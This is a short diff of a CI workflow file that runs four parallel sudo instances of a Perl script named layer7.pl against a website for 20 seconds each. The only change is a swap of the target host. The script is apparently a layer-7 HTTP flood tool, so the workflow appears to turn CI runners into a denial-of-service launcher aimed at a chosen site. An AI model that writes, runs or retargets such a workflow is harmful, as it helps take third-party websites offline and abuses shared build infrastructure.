@@ -20,7 +20,7 @@ jobs:
           chmod +x layer7.pl
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 20 perl layer7.pl http://graph.vshield.pro/ 1400 1400 15 &
+            sudo timeout 20 perl layer7.pl http://load.vmheaven.io/ 1400 1400 15 &
             PIDS+=($!)
           done
           
